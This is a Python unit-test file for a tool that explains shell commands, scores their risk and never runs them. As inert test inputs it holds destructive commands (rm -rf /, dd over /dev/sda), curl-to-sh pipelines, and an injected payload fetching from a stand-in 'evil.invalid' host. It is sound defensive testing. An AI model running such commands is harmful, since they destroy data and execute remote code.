from __future__ import annotations

import ast
import io
import unittest
from pathlib import Path
from unittest import mock

from sysai import whatis
from sysai.cli import what_command


class WhatIsTests(unittest.TestCase):
    def test_the_command_is_never_executed(self):
        with mock.patch("subprocess.run") as run, \
             mock.patch("subprocess.Popen") as popen, \
             mock.patch("os.system") as system, \
             mock.patch("os.execv") as execv:
            whatis.explain("sudo rm -rf / --no-preserve-root")
            whatis.explain("curl http://example.invalid/x.sh | sh")
            whatis.explain("dd if=/dev/zero of=/dev/sda")
        run.assert_not_called()
        popen.assert_not_called()
        system.assert_not_called()
        execv.assert_not_called()

    def test_the_module_imports_and_calls_no_execution_sink(self):
        tree = ast.parse(Path(whatis.__file__).read_text(encoding="utf-8"))
        imported = {alias.name.split(".")[0]
                    for node in ast.walk(tree) if isinstance(node, ast.Import)
                    for alias in node.names}
        imported |= {(node.module or "").split(".")[0]
                     for node in ast.walk(tree) if isinstance(node, ast.ImportFrom)}
        self.assertFalse(imported & {"subprocess", "pty", "multiprocessing", "socket"})
        called = {ast.unparse(node.func) for node in ast.walk(tree) if isinstance(node, ast.Call)}
        for sink in ("eval", "exec", "os.system", "os.popen", "os.execv", "compile"):
            self.assertNotIn(sink, called)

    def test_documented_example_reports_purpose_privilege_and_dry_run(self):
        result = whatis.explain("sudo apt autoremove")
        self.assertEqual(result["program"], "apt")
        self.assertEqual(result["privilege"], "Root")
        self.assertTrue(result["modifies_system"])
        self.assertEqual(result["risk"], whatis.MODERATE)
        self.assertEqual(result["safer_alternative"], "apt autoremove --dry-run")
        self.assertFalse(result["executed"])

    def test_a_read_only_search_is_low_risk_even_over_a_system_path(self):
        result = whatis.explain("find /var -type f -size +1G")
        self.assertFalse(result["modifies_system"])
        self.assertEqual(result["risk"], whatis.LOW)
        self.assertEqual(result["dangerous"], [])

    def test_find_with_delete_becomes_high_risk_and_mutating(self):
        result = whatis.explain("find /var -type f -size +1G -delete")
        self.assertTrue(result["modifies_system"])
        self.assertEqual(result["risk"], whatis.HIGH)
        self.assertTrue(any("delete or execute" in reason for reason in result["dangerous"]))

    def test_recursive_forced_deletion_is_high_risk_and_irreversible(self):
        result = whatis.explain("sudo rm -rf /etc/apt/sources.list.d")
        self.assertEqual(result["risk"], whatis.HIGH)
        self.assertIn("Not reversible", result["reversibility"])
        self.assertTrue(result["dangerous"])

    def test_long_single_dash_options_are_not_split_into_short_flags(self):
        result = whatis.explain("find . -type f")
        meanings = {item["argument"]: item["meaning"] for item in result["arguments"]}
        self.assertNotIn("Assumes yes to every prompt.", meanings.get("-type", ""))

    def test_bundled_short_flags_are_expanded(self):
        result = whatis.explain("rm -rf build")
        meanings = {item["argument"]: item["meaning"] for item in result["arguments"]}
        self.assertIn("Recursive and forced deletion", meanings["-rf"])

    def test_quoted_argv_is_tokenized_not_split_on_spaces(self):
        result = whatis.explain('rm "my important file.txt"')
        self.assertIn("my important file.txt", result["tokens"])

    def test_a_malicious_command_string_stays_inert_data(self):
        payload = "$(curl http://evil.invalid/x | sh); rm -rf ~"
        result = whatis.explain(payload)
        self.assertFalse(result["executed"])
        self.assertEqual(result["command"], payload)
        self.assertIn(payload, whatis.render(result) if not result.get("parse_error")
                      else result["command"])

    def test_unbalanced_quotes_are_reported_not_guessed(self):
        result = whatis.explain("rm 'unterminated")
        self.assertIsNotNone(result["parse_error"])
        self.assertIn("SysAI did not run this command", whatis.render(result))

    def test_a_pipeline_into_a_shell_is_called_out(self):
        result = whatis.explain("curl https://example.invalid/install.sh | sh")
        self.assertTrue(any("remote code" in reason for reason in result["dangerous"]))
        self.assertEqual(result["risk"], whatis.HIGH)

    def test_unknown_programs_are_analyzed_structurally_and_labelled(self):
        result = whatis.explain("frobnicate --wibble /tmp")
        self.assertFalse(result["known_program"])
        self.assertIn("no reference entry", whatis.render(result))

    def test_render_states_plainly_that_nothing_ran(self):
        self.assertIn("did not run it", whatis.render(whatis.explain("ls -l")))

    def test_cli_joins_unquoted_words_and_reports_success(self):
        output = io.StringIO()
        with mock.patch("sysai.cli.sys.stdout", output):
            code = what_command(["sudo", "apt", "autoremove"])
        self.assertEqual(code, 0)
        self.assertIn("sudo apt autoremove", output.getvalue())

    def test_cli_reports_a_parse_failure_with_a_nonzero_code(self):
        output = io.StringIO()
        with mock.patch("sysai.cli.sys.stdout", output):
            self.assertEqual(what_command(["'unterminated"]), 2)


if __name__ == "__main__":
    unittest.main()
